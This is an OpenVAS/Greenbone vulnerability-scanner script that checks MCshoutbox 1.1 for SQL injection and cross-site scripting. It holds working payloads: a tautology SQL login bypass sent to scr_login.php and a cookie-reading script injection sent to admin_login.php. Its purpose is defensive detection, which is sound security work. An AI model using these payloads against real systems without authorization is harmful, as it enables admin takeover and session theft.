# Copyright (C) 2009 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900883");
  script_version("2022-02-22T15:13:46+0000");
  script_tag(name:"last_modification", value:"2022-02-22 15:13:46 +0000 (Tue, 22 Feb 2022)");
  script_tag(name:"creation_date", value:"2009-10-29 07:53:15 +0100 (Thu, 29 Oct 2009)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2009-3714", "CVE-2009-3715");
  script_name("MCshoutbox Multiple SQL Injection and XSS Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2009 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://secunia.com/advisories/35885/");
  script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/9205");
  script_xref(name:"URL", value:"http://www.vupen.com/english/advisories/2009/1961");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to bypass the
  authentication mechanism when 'magic_quotes_gpc' is disabled or can cause arbitrary code
  execution by uploading the shell code in the context of the web application.");

  script_tag(name:"affected", value:"MCshoutbox version 1.1 on all running platform");

  script_tag(name:"insight", value:"- Input passed via the 'loginerror' to admin_login.php is not
  properly sanitised before being returned to the user. This can be exploited to execute arbitrary
  HTML and script code in a user's browser session in the context of an affected site.

  - Input passed via the 'username' and 'password' parameters to scr_login.php
    is not properly sanitised before being used in an SQL query. This can be
    exploited to manipulate SQL queries by injecting arbitrary SQL code.

  - The application does not properly check extensions of uploaded 'smilie'
    image files. This can be exploited to upload and execute arbitrary PHP code.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"MCshoutbox is prone to multiple SQL Injection and Cross-Site Scripting vulnerabilities.");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port( default:80 );

if( ! http_can_host_php( port:port ) ) exit( 0 );

host = http_host_name( port:port );

foreach dir( make_list_unique( "/MCshoutBox", "/shoutbox", "/box", "/", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  sndReq1 = http_get( item:dir + "/shoutbox.php", port:port );
  rcvRes1 = http_keepalive_send_recv( port:port, data:sndReq1 );

  if( ">Shoutbox<" >< rcvRes1 && egrep( pattern:"^HTTP/1\.[01] 200", string:rcvRes1 ) ) {

    filename1 = dir + "/scr_login.php";
    filename2 = dir + "/admin_login.php";

    authVariables = "username='or''='&password='or''='";

    sndReq2 = string("POST ", filename1, " HTTP/1.1\r\n",
                     "Host: ", host, "\r\n",
                     "Referer: http://", host, filename2, "\r\n",
                     "Content-Type: application/x-www-form-urlencoded\r\n",
                     "Content-Length: ", strlen(authVariables), "\r\n\r\n",
                      authVariables);
    rcvRes2 = http_keepalive_send_recv( port:port, data:sndReq2 );

    if( egrep( pattern:"Location: admin.php", string:rcvRes2 ) ) {
      report = http_report_vuln_url( port:port, url:filename2 );
      security_message( port:port, data:report );
      exit( 0 );
    }

    url = string( dir, "/admin_login.php?loginerror=" +
                       "<script>alert(document.cookie)</script>" );
    sndReq3 = http_get( item:url, port:port );
    rcvRes3 = http_keepalive_send_recv(port:port, data:sndReq3);
    if( rcvRes3 =~ "^HTTP/1\.[01] 200" && "><script>alert(document.cookie)</script><" >< rcvRes3 ) {
        report = http_report_vuln_url( port:port, url:url );
        security_message( port:port, data:report );
        exit( 0 );
    }
  }
}

exit( 99 );
